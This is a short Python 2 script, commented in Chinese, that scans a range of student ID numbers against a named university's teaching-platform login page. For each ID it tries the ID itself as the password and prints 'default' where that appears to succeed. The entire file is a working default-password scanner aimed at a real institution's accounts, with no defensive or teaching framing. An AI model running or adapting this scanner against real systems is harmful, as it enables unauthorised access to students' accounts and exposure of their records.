#!/usr/bin/python
# -*- coding: UTF-8 -*-
#任意学号范围教务处登录弱口令扫描（单线程无速度限制），结果为default即成功确认为默认口令（学号），2017/08/02

import urllib2

def download(url):
    #print 'Downloading:',url(if want show detal cancel this #)
    try:
        html=urllib2.urlopen(url).read()
    except urllib2.URLError as e:
        print 'Donwnload error:',e.reason
        html=None
    return html

for i in range(2014122001,2014122090):
    url='http://jxpt.cuit.edu.cn/eol/homepage/common/login.jsp?IPT_LOGINUSERNAME='+str(i)+'&IPT_LOGINPASSWORD='+str(i)+''
    html=download(url)
    if(html[47] == 'm'and html[48] == 'e'):
        print(''+str(i)+'  no')
    else:
        print(''+str(i)+'  default')
